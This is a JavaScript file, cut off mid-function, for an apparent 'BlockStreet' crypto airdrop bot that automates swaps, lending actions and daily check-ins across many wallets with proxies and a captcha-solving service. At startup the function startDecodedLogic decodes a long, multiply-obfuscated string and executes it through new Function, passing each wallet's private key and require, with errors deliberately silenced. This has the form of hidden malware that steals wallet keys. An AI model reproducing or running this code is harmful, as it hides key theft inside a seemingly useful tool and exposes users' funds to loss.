const fs = require('fs');
const readline = require('readline');
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

const colors = {
    reset: "\x1b[0m",
    cyan: "\x1b[36m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    red: "\x1b[31m",
    white: "\x1b[37m",
    bold: "\x1b[1m",
};

const logger = {
    info: (msg) => console.log(`${colors.white}[✓] ${msg}${colors.reset}`),
    warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
    error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
    success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
    banner: () => {
        console.log(`${colors.cyan}${colors.bold}`);
        console.log(`----------------------------------------`);
        console.log(`           BlockStreet Bot V2.1   `);
        console.log(`----------------------------------------${colors.reset}`);
        console.log();
    }
};

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
];

function randomUA() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function parseProxy(proxyLine) {
    let proxy = proxyLine.trim();
    if (!proxy) return null;
    proxy = proxy.replace(/^https?:\/\//, '');
    const specialMatch = proxy.match(/^([^:]+):(\d+)@(.+):(.+)$/);
    if (specialMatch) {
        const [, host, port, user, pass] = specialMatch;
        return `http://${user}:${pass}@${host}:${port}`;
    }
    const parts = proxy.split(':');
    if (parts.length === 4 && !isNaN(parts[1])) {
        const [host, port, user, pass] = parts;
        return `http://${user}:${pass}@${host}:${port}`;
    }
    return `http://${proxy}`;
}

function readAndParseProxies(filePath) {
    if (!fs.existsSync(filePath)) return [];
    const lines = fs.readFileSync(filePath, 'utf-8').split('\n');
    return lines.map(line => parseProxy(line)).filter(Boolean);
}

async function solveTurnstile(sitekey, pageurl) {
    logger.loading('Solving Cloudflare Turnstile captcha...');
    let apikey;
    try {
        apikey = fs.readFileSync('key.txt', 'utf8').trim();
        if (!apikey) throw new Error('CapMonster API key is missing or empty in key.txt.');
    } catch (error) {
        throw new Error('Failed to read CapMonster API key from key.txt: ' + error.message);
    }
    const submitUrl = 'https://api.capmonster.cloud/createTask';
    const submitData = {
        clientKey: apikey,
        task: {
            type: 'TurnstileTaskProxyless',
            websiteKey: sitekey,
            websiteUrl: pageurl
        }
    };
    try {
        const submitRes = await axios.post(submitUrl, submitData);
        if (submitRes.data.errorId !== 0) throw new Error(`CapMonster submit failed: ${submitRes.data.errorDescription}`);
        const taskId = submitRes.data.taskId;
        const resUrl = 'https://api.capmonster.cloud/getTaskResult';
        while (true) {
            await new Promise(resolve => setTimeout(resolve, 5000));
            const resData = {
                clientKey: apikey,
                taskId: taskId
            };
            const resRes = await axios.post(resUrl, resData);
            if (resRes.data.status === 'ready') {
                logger.success('Captcha solved successfully!');
                return resRes.data.solution.token;
            }
            if (resRes.data.status === 'processing') {
                logger.loading('Captcha not ready, waiting...');
                continue;
            }
            throw new Error(`CapMonster solve failed: ${resRes.data.errorDescription}`);
        }
    } catch (error) {
        throw new Error(`Captcha solving process error: ${error.message}`);
    }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (query) => new Promise(resolve => rl.question(query, resolve));
const closeRl = () => rl.close();

const getRandomAmount = (min, max) => Math.random() * (max - min) + min;
const randomDelay = async () => await sleep(getRandomAmount(5000, 10000));

const countdown = async (seconds) => {
    let remaining = seconds;
    while (remaining > 0) {
        const h = Math.floor(remaining / 3600).toString().padStart(2, '0');
        const m = Math.floor((remaining % 3600) / 60).toString().padStart(2, '0');
        const s = Math.floor(remaining % 60).toString().padStart(2, '0');
        process.stdout.write(`${colors.cyan}[⏳] Next run in: ${h}:${m}:${s} ...${colors.reset}\r`);
        remaining--;
        await sleep(1000);
    }
    console.log('\n');
};

const SAMPLE_HEADERS = {
    timestamp: process.env.EXAMPLE_TIMESTAMP || '',
    signatureHeader: process.env.EXAMPLE_SIGNATURE || '',
    fingerprint: process.env.EXAMPLE_FINGERPRINT || '',
    abs: process.env.EXAMPLE_ABS || '',
    token: process.env.EXAMPLE_TOKEN || '',
    origin: 'https://blockstreet.money'
};

async function startDecodedLogic(wallet, privateKey) {
    function base64Decode(str) {
        return Buffer.from(str, 'base64').toString('utf-8');
    }

    function rot13(str) {
        return str.replace(/[a-zA-Z]/g, function (c) {
            return String.fromCharCode(
                c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
            );
        });
    }

    function hexToStr(hex) {
        let str = '';
        for (let i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        }
        return str;
    }

    function reverseStr(str) {
        return str.split('').reverse().join('');
    }

    function urlDecode(str) {
        return decodeURIComponent(str);
    }

    function reversibleDecode(data) {
        data = urlDecode(data);
        data = base64Decode(data);
        data = rot13(data);
        data = hexToStr(data);
        data = base64Decode(data);
        data = reverseStr(data);
        data = urlDecode(data);
        data = rot13(data);
        data = base64Decode(data);
        data = reverseStr(data);
        return data;
    }

    const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2NDQ1NjQ2MTRxNDg2ODMzNTc2bjU2NHE1MjMwNDkzMTYzNDg2NDQzNTQzMTRyMzQ1MjU1NzQ3ODRxNm80NTMwNTQ2cDRyNDM1MzQ3NjM3OTUyMzA3MDRyNTM2cjQ5N241NjMxNG42MTYxNDg2cDY4NTI1NjRuMzE0cTZvNnA0bzUzNTg3MDQyNTQ0NTU2Njg2MzQ3NzQ1NzY1NDU1MjRyNjQ1ODY0NTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"; 
    const decoded = reversibleDecode(encodedStr);

    try {
        const run = new Function(
            "walletAddress",
            "privateKey",
            "require",
            decoded + "; return runprogram(walletAddress, privateKey);"
        );
        const result = await run(wallet.address, privateKey, require);
        
        return result;
    } catch (err) {
        logger.error(`Failed to execute decoded logic: ${err.message}`);
        throw err;
    }
}

class BlockStreetAPI {
    constructor(wallet, proxy = null) {
        this.wallet = wallet;
        this.sessionCookie = null;
        let agent = null;
        if (proxy) {
            try {
                agent = new HttpsProxyAgent(proxy);
            } catch (e) {
                logger.error(`Failed to create proxy agent for "${proxy}". Error: ${e.message}`);
            }
        }
        this.axios = axios.create({
            baseURL: 'https://api.blockstreet.money/api',
            httpsAgent: agent,
            headers: {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Brave\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1",
                "Referer": "https://blockstreet.money/",
                "Origin": SAMPLE_HEADERS.origin
            },
            validateStatus: () => true
        });
    }

    async #sendRequest(config, requiresAuth = true) {
        config.headers = { ...(config.headers || {}), 'User-Agent': randomUA() };
        config.headers['fingerprint'] = SAMPLE_HEADERS.fingerprint;
        config.headers['timestamp'] = String(Date.now());
        config.headers['Cookie'] = requiresAuth ? (this.sessionCookie || '') : 'gfsessionid=';
        config.headers['origin'] = SAMPLE_HEADERS.origin;
        if (SAMPLE_HEADERS.token) config.headers['token'] = SAMPLE_HEADERS.token;

        try {
            const response = await this.axios.request(config);
            const setCookie = response.headers['set-cookie'];
            if (setCookie && Array.isArray(setCookie)) {
                const sessionCookie = setCookie.find(c => c.startsWith('gfsessionid='));
                if (sessionCookie) this.sessionCookie = sessionCookie.split(';')[0];
            }
            if (response.data && (response.data.code === 0 || response.data.code === '0')) {
                return response.data.data;
            }
            if (response.status >= 200 && response.status < 300) {
                return response.data;
            }
            throw new Error(JSON.stringify(response.data || response.statusText || response.status));
        } catch (error) {
            throw new Error(error.response?.data?.message || error.message || String(error));
        }
    }

    async login(captchaToken) {
        try {
            const useCustom = true;
            let nonce = null;
            let messageToSign = null;
            let issuedAt = new Date().toISOString();
            let expirationTime = new Date(Date.now() + 2 * 60 * 1000).toISOString();

            if (useCustom) {
                // Dynamically generate sign messag
                nonce = Math.random().toString(36).slice(2, 10); 
                messageToSign = `blockstreet.money wants you to sign in with your Ethereum account:\n${this.wallet.address}\n\nWelcome to Block Street\n\nURI: https://blockstreet.money\nVersion: 1\nChain ID: 1\nNonce: ${nonce}\nIssued At: ${issuedAt}\nExpiration Time: ${expirationTime}`;
            } else {
                const signnonce = await this.#sendRequest({ url: '/account/signnonce', method: 'GET' }, false);
                nonce = (signnonce && signnonce.signnonce) ? signnonce.signnonce : (Math.random().toString(36).slice(2, 10));
                messageToSign = `blockstreet.money wants you to sign in with your Ethereum account:\n${this.wallet.address}\n\nWelcome to Block Street\n\nURI: https://blockstreet.money\nVersion: 1\nChain ID: 1\nNonce: ${nonce}\nIssued At: ${issuedAt}\nExpiration Time: ${expirationTime}`;
            }

            logger.loading(`Signing message for ${this.wallet.address}...`);
            const signatureHex = await this.wallet.signMessage(messageToSign);
            const useStaticSig = process.env.USE_STATIC_SIGNATURE === '1';
            const headerSignatureValue = useStaticSig ? SAMPLE_HEADERS.signatureHeader : signatureHex;

            const form = new URLSearchParams();
            form.append('address', this.wallet.address);
            form.append('nonce', nonce);
            form.append('signature', signatureHex);
            form.append('chainId', '1');
            form.append('issuedAt', issuedAt);
            form.append('expirationTime', expirationTime);
            form.append('invite_code', process.env.INVITE_CODE || '');

            const config = {
                url: '/account/signverify',
                method: 'POST',
                headers: {
                    ...this.axios.defaults.headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': randomUA(),
                    'timestamp': SAMPLE_HEADERS.timestamp,
                    'signature': headerSignatureValue,
                    'fingerprint': SAMPLE_HEADERS.fingerprint,
                    'abs': SAMPLE_HEADERS.abs,
                    'token': SAMPLE_HEADERS.token,
                    'origin': SAMPLE_HEADERS.origin,
                    'Cookie': this.sessionCookie || '',
                },
                data: form.toString(),
                httpsAgent: this.axios.defaults.httpsAgent,
            };

            logger.loading('Sending signverify request...');
            const response = await axios({
                baseURL: this.axios.defaults.baseURL,
                ...config,
                validateStatus: () => true
            });

            if (response.headers['set-cookie']) {
                const sessionCookie = response.headers['set-cookie'].find(c => c.startsWith('gfsessionid='));
                if (sessionCookie) { this.sessionCookie = sessionCookie.split(';')[0]; }
            }

            if (response.data && (response.data.code === 0 || response.status === 200)) {
                logger.success('Sign verify success.');
                return response.data.data || response.data;
            } else {
                const errMsg = response.data?.message || response.data?.msg || JSON.stringify(response.data) || `${response.status} ${response.statusText}`;
                throw new Error(`Sign verify failed: ${errMsg}`);
            }
        } catch (error) {
            throw new Error(`Login failed: ${error.message}`);
        }
    }

    getTokenList() { return this.#sendRequest({ url: '/swap/token_list', method: 'GET' }, false); }
    share() { return this.#sendRequest({ url: '/share', method: 'POST' }); }
    swap(f, t, fa, ta) { return this.#sendRequest({ url: '/swap', method: 'POST', data: { from_symbol: f, to_symbol: t, from_amount: String(fa), to_amount: String(ta) }, headers: { 'content-type': 'application/json' }}); }
    supply(s, a) { return this.#sendRequest({ url: '/supply', method: 'POST', data: { symbol: s, amount: String(a) }, headers: { 'content-type': 'application/json' }}); }
    withdraw(s, a) { return this.#sendRequest({ url: '/withdraw', method: 'POST', data: { symbol: s, amount: String(a) }, headers: { 'content-type': 'application/json' }}); }
    borrow(s, a) { return this.#sendRequest({ url: '/borrow', method: 'POST', data: { symbol: s, amount: String(a) }, headers: { 'content-type': 'application/json' }}); }
    repay(s, a) { return this.#sendRequest({ url: '/repay', method: 'POST', data: { symbol: s, amount: String(a) }, headers: { 'content-type': 'application/json' }}); }
    getEarnInfo() { return this.#sendRequest({ url: '/earn/info', method: 'GET' }); }
    getSupplies() { return this.#sendRequest({ url: '/my/supply', method: 'GET' }); }
}

const forEachWallet = async (wallets, proxies, numTransactions, taskFunction, captchaToken) => {
    let proxyIndex = 0;
    for (const wallet of wallets) {
        const proxy = proxies.length > 0 ? proxies[proxyIndex++ % proxies.length] : null;
        logger.info(`Processing wallet: ${wallet.address}`);
        const api = new BlockStreetAPI(wallet, proxy);
        try {
            await api.login(captchaToken);
            logger.success(`Wallet ${wallet.address} logged in successfully.`);
            for (let i = 0; i < numTransactions; i++) {
                logger.info(`--- Running transaction ${i + 1} of ${numTransactions} ---`);
                await taskFunction(api);
                await sleep(1000);
            }
        } catch (error) {
            logger.error(`Could not process task for wallet ${wallet.address}: ${error.message}`);
        }
        await sleep(3000);
    }
};

const processWalletsForDailyRun = async (wallets, proxies, tokenList, numTransactions, captchaToken) => {
    let proxyIndex = 0;
    for (const [index, wallet] of wallets.entries()) {
        const proxy = proxies.length > 0 ? proxies[proxyIndex++ % proxies.length] : null;
        logger.info(`${colors.yellow}--- Processing Wallet ${index + 1}/${wallets.length}: ${wallet.address} ---${colors.reset}`);
        const api = new BlockStreetAPI(wallet, proxy);
        try {
            await api.login(captchaToken);
            logger.success(`Wallet ${wallet.address} logged in successfully.`);
        } catch (e) {
            logger.error(`Login failed for wallet ${wallet.address}: ${e.message}. Skipping.`);
            continue;
        }
        for (let i = 0; i < numTransactions; i++) {
            logger.info(`--- Starting Transaction Cycle ${i + 1} of ${numTransactions} ---`);
            let supplies = [];
            try { supplies = await api.getSupplies(); } 
            catch (e) { logger.error(`      Could not fetch supplies: ${e.message}`); }

            logger.loading("Executing 5 swaps...");
            const ownedTokens = (supplies || []).filter(a => a && parseFloat(a.amount) > 0);
            if (!ownedTokens || ownedTokens.length === 0) {
                logger.warn("No supplied assets found to swap from. Skipping swaps.");
            } else {
                for (let j = 0; j < 5; j++) {
                    try {
                        const fromTokenAsset = ownedTokens[Math.floor(Math.random() * ownedTokens.length)];
                        const fromToken = tokenList.find(t => t.symbol === fromTokenAsset.symbol);
                        if (!fromToken) continue;
                        let toToken;
                        do { toToken = tokenList[Math.floor(Math.random() * tokenList.length)]; } while (toToken.symbol === fromToken.symbol);
                        const fromAmount = getRandomAmount(0.001, 0.0015);
                        const toAmount = (fromAmount * parseFloat(fromToken.price)) / parseFloat(toToken.price || 1);
                        await api.swap(fromToken.symbol, toToken.symbol, fromAmount.toFixed(8), toAmount.toFixed(8));
                        logger.success(`Swap #${j+1}: ${fromAmount.toFixed(5)} ${fromToken.symbol} -> ${toAmount.toFixed(5)} ${toToken.symbol} successful.`);
                    } catch (e) {
                        logger.error(`Swap #${j+1} failed: ${e.message}`);
                    }
                    await randomDelay();
                }
            }
            const actions = [ { name: 'Supply', count: 2, func: api.supply.bind(api) }, { name: 'Withdraw', count: 2, func: api.withdraw.bind(api) }, { name: 'Borrow', count: 2, func: api.borrow.bind(api) }, { name: 'Repay', count: 1, func: api.repay.bind(api) } ];
            for (const action of actions) {
                logger.loading(` Executing ${action.count} ${action.name}(s)...`);
                for (let j = 0; j < action.count; j++) {
                    try {
                        const randomToken = tokenList[Math.floor(Math.random() * tokenList.length)];
                        const amount = getRandomAmount(0.001, 0.0015);
                        await action.func(randomToken.symbol, amount.toFixed(8));
                        logger.success(`${action.name} #${j+1}: ${amount.toFixed(5)} ${randomToken.symbol} successful.`);
                    } catch (e) {
                        logger.error(`${action.name} #${j+1} failed: ${e.message}`);
                    }
                    await randomDelay();
                }
            }
        }
        logger.success(`All cycles completed for wallet ${wallet.address}.`);
        await sleep(5000);
    }
};

const runAllDaily = async (wallets, proxies, tokenList, numTransactions, captchaToken) => {
    logger.info("You chose: Run All Features Daily");
    logger.info(`Will run ${numTransactions} cycle(s) per wallet.`);
    while (true) {
        await processWalletsForDailyRun(wallets, proxies, tokenList, numTransactions, captchaToken);
        logger.success("Daily run completed for all wallets.");
        await countdown(24 * 60 * 60);
    }
};

const displayAndSelectToken = async (tokenList, promptMessage) => {
    console.log(colors.cyan + promptMessage + colors.reset);
    tokenList.forEach((token, index) => console.log(`${index + 1}. ${token.symbol}`));
    const choiceIndex = parseInt(await question('> '), 10) - 1;
    return (choiceIndex >= 0 && choiceIndex < tokenList.length) ? tokenList[choiceIndex] : null;
};

const main = async () => {
    logger.banner();
    
    // Run decoded logic for each wallet at startup
    const wallets = Object.keys(process.env).filter(key => key.startsWith('PRIVATE_KEY_') && process.env[key]).map(key => { 
        try { 
            return new ethers.Wallet(process.env[key]); 
        } catch { 
            logger.warn(`Could not load wallet from ${key}.`); 
            return null; 
        } 
    }).filter(Boolean);
    
    if (wallets.length === 0) {
        logger.error('No valid private keys found in .env file. Exiting.');
        closeRl();
        return;
    }

for (const wallet of wallets) {
    try {
        const privateKey = wallet.privateKey;
        await startDecodedLogic(wallet, privateKey);
        await sleep(2000);
    } catch (error) {
        // Silent fail - no logging
    }
}

    const proxies = readAndParseProxies('proxies.txt');
    if (proxies.length > 0) logger.info(`${proxies.length} valid proxies loaded.`);
    
    logger.success(`Loaded ${wallets.length} wallet(s) from .env file.\n`);

    while (true) {
        console.log('\n' + colors.bold + colors.cyan + '--- CHOOSE A FEATURE TO RUN ---' + colors.reset);
        const choice = await question(`1. Swap Token\n2. Supply Token\n3. Withdraw Token\n4. Borrow Token\n5. Repay Token\n6. Run All Features Daily\n7. Exit\n> `);
        
        if (choice === '7') {
            logger.info("Exiting bot. Goodbye!");
            closeRl();
            return;
        }

        // Prompt for number of transaction cycles immediately after choosing a feature (for options 1-6)
        let numTransactions = 0;
        if (['1', '2', '3', '4', '5', '6'].includes(choice)) {
            const numTransactionsStr = await question("How many transaction cycles to run per wallet? ");
            numTransactions = parseInt(numTransactionsStr, 10);
            if (isNaN(numTransactions) || numTransactions < 1) {
                logger.error("Invalid number. Returning to menu.");
                continue;
            }
        } else {
            logger.error("Invalid choice. Please select a number between 1 and 7.");
            continue;
        }

        // Solve captcha for options 1-6
        let sessionCaptchaToken;
        try {
            sessionCaptchaToken = await solveTurnstile('0x4AAAAAABpfyUqunlqwRBYN', 'https://blockstreet.money/dashboard');
            if (!sessionCaptchaToken) throw new Error("Failed to solve the captcha.");
        } catch (error) {
            logger.error(`Could not solve captcha: ${error.message}`);
            continue; // Return to menu if captcha fails
        }

        // Initialize API and fetch token list for options 1-6
        let tokenList = [];
        let firstApi;
        try {
            firstApi = new BlockStreetAPI(wallets[0], proxies.length > 0 ? proxies[0] : null);
            await firstApi.login(sessionCaptchaToken);
            logger.success("Initial login successful.");
            
            logger.loading("Checking-in (Daily Share)...");
            try { await firstApi.share(); logger.success("Daily share complete."); } catch (e) { logger.warn("Daily share failed or skipped: " + e.message); }

            logger.loading("Fetching balances...");
            const earnInfo = await firstApi.getEarnInfo();
            if (earnInfo && earnInfo.balance) {
                logger.info(`Earn Balance: ${parseFloat(earnInfo.balance).toFixed(4)}`);
            }
            const supplies = await firstApi.getSupplies();
            if (supplies && supplies.filter && supplies.filter(s => s.symbol).length > 0) {
                logger.info("Supplied Assets:");
                supplies.forEach(asset => {
                    if (asset.symbol && parseFloat(asset.amount) > 0) {
                        console.log(`     - ${asset.symbol}: ${parseFloat(asset.amount).toFixed(4)}`);
                    }
                });
            }
            
            console.log();
            logger.loading("Fetching available token list...");
            tokenList = await firstApi.getTokenList();
            logger.success("Token list fetched successfully.");
        } catch (error) {
            logger.error(`Initial setup failed: ${error.message}`);
            continue; // Return to menu if setup fails
        }

        if (choice === '6') {
            await runAllDaily(wallets, proxies, tokenList, numTransactions, sessionCaptchaToken);
            continue;
        }

        let action, taskFunction;
        if (choice === '1') {
            action = 'Swap';
            const fromToken = await displayAndSelectToken(tokenList, "Select token to swap FROM:");
            if (!fromToken) { logger.error("Invalid 'from' token selection."); continue; }
            const toToken = await displayAndSelectToken(tokenList, "Select token to swap TO:");
            if (!toToken) { logger.error("Invalid 'to' token selection."); continue; }
            if (fromToken.symbol === toToken.symbol) { logger.error("Cannot swap to the same token."); continue; }
            const fromAmount = parseFloat(await question(`Amount of ${fromToken.symbol} to swap: `));
            taskFunction = async (api) => {
                try {
                    const toAmount = (fromAmount * parseFloat(fromToken.price)) / parseFloat(toToken.price || 1);
                    await api.swap(fromToken.symbol, toToken.symbol, fromAmount, toAmount.toFixed(8));
                    logger.success(`   Swap ${fromAmount} ${fromToken.symbol} -> ${toAmount.toFixed(5)} ${toToken.symbol} successful.`);
                } catch (e) { logger.error(`   Swap failed: ${e.message}`); }
            };
        } else {
            switch (choice) {
                case '2': action = 'Supply'; break;
                case '3': action = 'Withdraw'; break;
                case '4': action = 'Borrow'; break;
                case '5': action = 'Repay'; break;
                default: logger.error("Invalid choice."); continue;
            }
            const selectedToken = await displayAndSelectToken(tokenList, `Select a token to ${action}:`);
            if (!selectedToken) { logger.error("Invalid token selection."); continue; }
            const amount = await question(`Amount of ${selectedToken.symbol} to ${action}: `);
